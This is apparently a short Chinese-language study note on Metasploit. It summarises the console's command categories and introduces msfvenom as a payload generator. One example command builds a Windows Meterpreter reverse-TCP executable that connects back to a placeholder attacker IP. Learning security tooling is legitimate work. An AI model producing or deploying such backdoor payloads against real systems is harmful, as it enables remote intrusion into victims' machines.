---
title: metasploit（1）
date: 2020-03-09 15:13:28
tags:
	- 渗透

---

1

命令分类（直接help查看到的）

```
核心命令
	cd 当前机器上切换目录。
	connect 连接到目标机器。
	get/set 获取或设置变量
	load 载入一个插件。
	repeat 重复一系列的命令。
	sessions 查看活跃的会话。
模块命令
	advanced 显示当前模块的高级特性。
	back 这个就是从当前模块退出去。这样来切换用另外一个模块。
	show 后面跟参数，例如options。
	search 查看模块。
	use使用模块。
job命令
	jobs 当前当前任务。
	kill杀掉一个job。
	
资源脚本命令
	就2个。
	makerc
	resource
	
数据库命令
	hosts 数据库里所有的主机。例如我们刚刚进行了一次扫描，则扫描的主机信息可以看到。
	vulns 查看漏洞。
开发者命令
辅助命令
	run
	exploit
	这2个命令最常用。exploit是run的别名。
```

代码在这里：

https://gitlab.com/kalilinux/packages/metasploit-framework



msfvenom

这个是什么？

从help信息看，是一个payload生成器。

用法是这样：

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
```

msfvenom是取代之前的msfpayload和msfencode这2个命令的。

payload就是攻击负载，例如是一个后门程序。



参考资料

1、官方文档

https://metasploit.help.rapid7.com/docs

2、Metasploit 平常『习惯』的养成

https://www.bodkin.ren/index.php/archives/458/